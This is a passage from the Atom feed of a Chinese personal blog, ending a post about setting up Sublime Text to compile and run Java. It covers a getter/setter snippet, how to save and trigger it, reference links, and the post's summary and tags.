class="name">scope</span>&gt;</span>source.java<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- Optional: Description to show in the menu --&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="xml"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Create getter and setter methods<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">snippet</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>修改好后保存为<code>getset.sublime-snippet</code><br>在使用时，在需要添加代码段的地方输入<code>getset</code>，点击Tab补全即可<br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ09.png"><br><img src="/img/loading.gif" alt="Text" class="lazyload" data-src="/images/SJ10.png"></p><h2 id="6-参考资料"><a href="#6-参考资料" class="headerlink" title="6.参考资料"></a>6.参考资料</h2><ul><li><a href="https://blog.csdn.net/GuuInBelieve/article/details/78482582" target="_blank" rel="noopener">getset</a></li><li><a href="https://blog.csdn.net/qq_38295511/article/details/81140069" target="_blank" rel="noopener">Java运行</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;假期因为疫情出不去，于是在家重新学习Java，实在不想使用Eclipse（太笨重），于是学习了一下使用Sublime编译运行Java，在网上看了几篇教程，做个总结记录一下。&lt;/p&gt;
&lt;h2 id=&quot;1-安装好JDK并配置好环境变量&quot;&gt;&lt;a href=&quot;#1-安装好JDK并配
      
    
    </summary>
    
    
      <category term="技巧总结" scheme="www.jarvis-cy.com/categories/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="Java" scheme="www.jarvis-cy.com/tags/Java/"/>
    
      <category term="Sublime" scheme="www.jarvis-cy.com/tags/Sublime/"/>
    
  </entry>
  
</feed>
